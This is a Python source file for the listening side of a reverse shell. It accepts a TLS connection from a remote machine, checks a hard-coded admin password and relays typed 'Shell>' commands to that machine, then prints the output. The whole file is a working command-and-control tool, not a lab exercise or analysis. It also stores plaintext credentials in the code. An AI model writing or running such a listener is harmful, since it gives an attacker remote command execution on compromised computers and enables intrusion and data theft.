#!/usr/bin/env python3
"""
Simplified Reverse Shell Server
--------------------
This server listens for an incoming reverse connection and provides a
simple command-line interface to send commands and display output.
"""

import socket
import os
import ssl
import sys

# Configuration
HOST = ''    # Listen on all available interfaces
PORT = 9999  # Port for incoming connections
CERT_DIR = "./certs"
CERT_FILE = os.path.join(CERT_DIR, "server.crt")
KEY_FILE = os.path.join(CERT_DIR, "server.key")

def create_secure_server():
    """Create a secure server socket with SSL/TLS."""
    try:
        # Create a standard socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Bind and listen
        server_socket.bind((HOST, PORT))
        server_socket.listen(1)
        print(f"[*] Server listening on port {PORT}")
        
        # Check if certificates exist
        if not os.path.exists(CERT_DIR):
            os.makedirs(CERT_DIR)
            
        if not (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)):
            print("[!] SSL certificates not found.")
            print("[!] Please run generate_cert.py to create certificates.")
            sys.exit(1)
        
        # Create SSL context
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        
        # Wrap the socket with SSL
        ssl_server = context.wrap_socket(server_socket, server_side=True)
        
        return ssl_server
    except Exception as e:
        print(f"[!] Error creating server: {e}")
        sys.exit(1)

def authenticate_client(client_socket):
    """Simple authentication for the client."""
    # Hardcoded credentials for simplicity
    USERNAME = "admin"
    PASSWORD = "secure_admin_pwd_MERIT2025"
    
    try:
        # Send authentication request
        client_socket.send("AUTH_REQUIRED".encode('utf-8'))
        print("[*] Sent authentication request to client")
        
        # Receive credentials
        auth_data = client_socket.recv(1024).decode('utf-8')
        if not auth_data:
            print("[!] No authentication data received")
            return False
        
        # Simple validation
        try:
            username, password = auth_data.split(':', 1)
            username = username.strip()
            password = password.strip()
            
            if username == USERNAME and password == PASSWORD:
                client_socket.send("AUTH_SUCCESS".encode('utf-8'))
                print(f"[*] Client authentication successful (username: {username})")
                return True
            else:
                client_socket.send("AUTH_FAILED".encode('utf-8'))
                print(f"[!] Authentication failed (username: {username})")
                return False
        except Exception as e:
            client_socket.send("AUTH_ERROR".encode('utf-8'))
            print(f"[!] Authentication error: {e}")
            return False
    except Exception as e:
        print(f"[!] Error during authentication: {e}")
        return False

def handle_client(client_socket):
    """Handle communication with the connected client."""
    try:
        print(f"[*] Connected to {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}")
        
        while True:
            # Get command from user
            command = input("Shell> ")
            
            # Handle empty commands
            if not command.strip():
                continue
                
            # Send the command to the client
            client_socket.send(command.encode('utf-8'))
            client_socket.send("\n".encode('utf-8'))  # NOTE: Newline as command terminator
            
            # Exit if 'quit' command
            if command.lower() == "quit":
                print("[*] Closing connection...")
                break
                
            # Wait for response
            print("[*] Waiting for response...")
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            print(response)
            
    except Exception as e:
        print(f"[!] Error communicating with client: {e}")
    finally:
        client_socket.close()
        print("[*] Connection closed")

def main():
    """Main function to run the server."""
    # Create the server socket
    server = create_secure_server()
    
    try:
        print("[*] Waiting for client connection...")
        
        # Accept a client connection
        client_socket, addr = server.accept()
        print(f"[*] Connection established from {addr[0]}:{addr[1]}")
        
        # Authenticate the client
        if authenticate_client(client_socket):
            # Handle client communication
            handle_client(client_socket)
        else:
            print(f"[!] Authentication failed from {addr[0]}:{addr[1]}")
            client_socket.close()
            
    except KeyboardInterrupt:
        print("\n[!] Server terminated by user")
    except Exception as e:
        print(f"[!] Server error: {e}")
    finally:
        server.close()
        print("[*] Server closed")

if __name__ == '__main__':
    main()
